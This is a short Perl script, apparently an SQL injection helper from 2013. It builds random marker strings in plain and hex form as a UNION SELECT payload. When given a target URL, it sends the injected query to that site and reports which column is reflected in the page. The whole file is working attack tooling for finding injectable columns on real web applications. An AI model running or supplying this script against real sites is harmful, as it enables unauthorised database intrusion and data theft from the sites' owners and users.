#!/usr/bin/perl

																																
#	What does this script : This script will help you with SQli that hide the vulnerable column in the source.                  
#	Developper : Crown - 05/09/13 ()																								
#	Usage : ./payload.pl <number of column> <size of column name>																
# 																																
#	Exemple : ./payload.pl 5 6                                                                                                  
#	Output :																													
#																																
#	Payload with 5 column(s) (6 chars) : 'uBcI-1','MkPC-2','1xes-3','Bczk-4','sEb3-5'											
#	Payload (hex mode) with 5 column(s) (6 chars) : 0x754263492d31,0x4d6b50432d32,0x317865732d33,0x42637a6b2d34,0x734562332d35	 

use strict;
use warnings;
use LWP::Simple;

if(defined($ARGV[0]) == 0 || defined($ARGV[1]) == 0) 
{
	print("Usage : $0 <number of column> <size of column name>\n"); 
	exit(1); 
}

my ($number_column, $length_column_string, $char_buffer, $column, $column_hex) = ($ARGV[0],$ARGV[1],0,0,0);
my (@columns, @columns_hex) = ();
my @charset = qw(A Z E R T Y U I O P Q S D F G H J K L M W X C V B N 1 2 3 4 5 6 7 8 9 0 a z e r t y u i o p q s d f g h j k l m w x c v b n);

for(my $p = 1; $p <= $number_column; $p++)
{
	($column,$column_hex) = ("","");

	for(my $i = 0; $i < $length_column_string - 2; $i++)
	{
		$char_buffer = $charset[rand(62)];
		$column .= $char_buffer;
		$column_hex .= unpack('H*',"$char_buffer");
	}

	$column .= "-$p";
	$column_hex .= unpack('H*',"-");
	$column_hex .= unpack('H*',"$p");

	push(@columns, "'$column'");
	push(@columns_hex, "0x$column_hex");
}

($column,$column_hex) = (join(",",@columns),join(",",@columns_hex));

print "Payload with $number_column column(s) ($length_column_string chars) : $column\n\n";
print "Payload (hex mode) with $number_column column(s) ($length_column_string chars) : $column_hex\n\n";

if(defined($ARGV[2]) == 1 && defined($ARGV[3]) == 1)
{
	my $link = $ARGV[2]." union select $column_hex".$ARGV[3];
	my $source =  get($link);
	my $z = 1;

	print "Full URL :==> $link\n\n";
	
	foreach my $x (@columns) 
	{
		$x =~ s/'//g;
	
		if($source =~ /$x/)
		{
			print "Vulnerable column : ($z) with payload : $x\n";
		}
	
		$z++;
	}
}


